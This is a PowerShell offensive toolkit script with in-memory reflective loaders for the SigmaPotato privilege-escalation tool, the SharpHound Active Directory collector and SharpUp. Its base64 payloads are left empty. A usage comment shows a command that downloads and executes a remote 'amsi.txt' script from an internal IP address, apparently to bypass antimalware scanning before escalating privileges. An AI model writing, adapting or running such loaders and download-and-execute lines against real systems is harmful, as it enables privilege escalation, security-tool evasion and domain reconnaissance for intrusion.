# Invoke-SigmaPotato "whoami /all"
# Invoke-SigmaPotato 'powershell -c "iex (iwr -usebasicparsing http://192.168.45.215/amsi.txt);"'
function Invoke-SigmaPotato
{
    param(
        [Parameter(ValueFromRemainingArguments=$true)]
        [string[]]$Arguments
    )

    $base64binary=""

     $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    
    [SigmaPotato]::Main($Arguments)
    
    [Console]::SetOut($OldConsoleOut)
    
    $Results = $StringWriter.ToString()
    $Results
}
## Invoke-Bloodhound '-CollectionMethod All'
function Invoke-Bloodhound
{
        param(
        [Parameter(Mandatory=$false)]
        [string]$CommandLine
    )

    $base64binary=""

    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    
    $argArray = [System.Management.Automation.PSParser]::Tokenize($CommandLine, [ref]$null) | 
        Where-Object { $_.Type -eq 'CommandArgument' } | 
        ForEach-Object { $_.Content }
    
    [Sharphound.Program]::InvokeSharpHound($argArray)
    
    [Console]::SetOut($OldConsoleOut)
    
    $Results = $StringWriter.ToString()
    $Results
}

# https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpUp.ps1
function Invoke-SharpUp
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = ""

    )

    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String(""))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [UpSharp.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}


